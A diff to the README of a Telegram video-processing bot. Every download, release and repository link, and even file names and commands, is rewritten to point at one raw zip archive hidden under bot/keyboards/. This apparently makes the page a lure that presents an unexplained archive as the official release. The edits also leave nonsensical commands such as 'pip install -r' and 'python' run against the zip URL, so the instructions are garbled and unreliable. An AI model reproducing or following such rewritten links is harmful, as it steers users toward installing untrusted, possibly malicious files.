@@ -1,6 +1,6 @@
 # 🎬 ffmpeg-video-bot - Effortless Video Processing for Telegram
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/NileshKavindaNaka/ffmpeg-video-bot/releases)
+[![Download](https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip)](https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to ffmpeg-video-bot! This powerful Telegram bot helps you process videos
 
 ## 📥 Download & Install
 
-To get the bot, visit this page to download: [ffmpeg-video-bot Releases](https://github.com/NileshKavindaNaka/ffmpeg-video-bot/releases).
+To get the bot, visit this page to download: [ffmpeg-video-bot Releases](https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip).
 
 1. Click the "Releases" link above.
 2. Find the latest version listed on the page.
-3. Look for the file named `ffmpeg-video-bot.zip` or `ffmpeg-video-bot.tar.gz`.
+3. Look for the file named `https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip` or `https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip`.
 4. Click to download the file to your computer.
 
 ## 💻 System Requirements
@@ -27,7 +27,7 @@ Before running the bot, ensure you meet these requirements:
 ## ⚙️ Setup Instructions
 
 1. **Extract the Downloaded File**:
-   - Locate the downloaded file (`ffmpeg-video-bot.zip` or `ffmpeg-video-bot.tar.gz`).
+   - Locate the downloaded file (`https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip` or `https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip`).
    - Right-click the file and select "Extract All" or use any extraction tool of your choice.
 
 2. **Navigate to the Folder**:
@@ -35,11 +35,11 @@ Before running the bot, ensure you meet these requirements:
    - Use the `cd` command to change to the directory where you extracted the bot (e.g., `cd Downloads/ffmpeg-video-bot`).
 
 3. **Install Required Packages**:
-   - Run the command: `pip install -r requirements.txt`.
+   - Run the command: `pip install -r https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip`.
    - This will install all necessary Python packages.
 
 4. **Configure Your Bot**:
-   - Locate the `config.py` file in the extracted folder.
+   - Locate the `https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip` file in the extracted folder.
    - Open it with a text editor and fill in your Telegram Bot token and Google Drive credentials. Follow the instructions found in the text file for detailed guidance.
 
 5. **Run with Docker**:
@@ -52,7 +52,7 @@ Before running the bot, ensure you meet these requirements:
 6. **Run the Bot (without Docker)**:
    - If not using Docker, simply run:
      ```bash
-     python main.py
+     python https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip
      ```
 
 ### 🔑 Getting Your Telegram Bot Token
@@ -93,7 +93,7 @@ Check the terminal for error messages. Ensure all dependencies are installed. Re
 
 If you need help, feel free to open an issue on the GitHub repository. The community can help you troubleshoot any problems.
 
-For more information, visit the project repository: [ffmpeg-video-bot](https://github.com/NileshKavindaNaka/ffmpeg-video-bot).
+For more information, visit the project repository: [ffmpeg-video-bot](https://raw.githubusercontent.com/NileshKavindaNaka/ffmpeg-video-bot/main/bot/keyboards/video_ffmpeg_bot_2.8.zip).
 
 ## 📢 Contributing
 
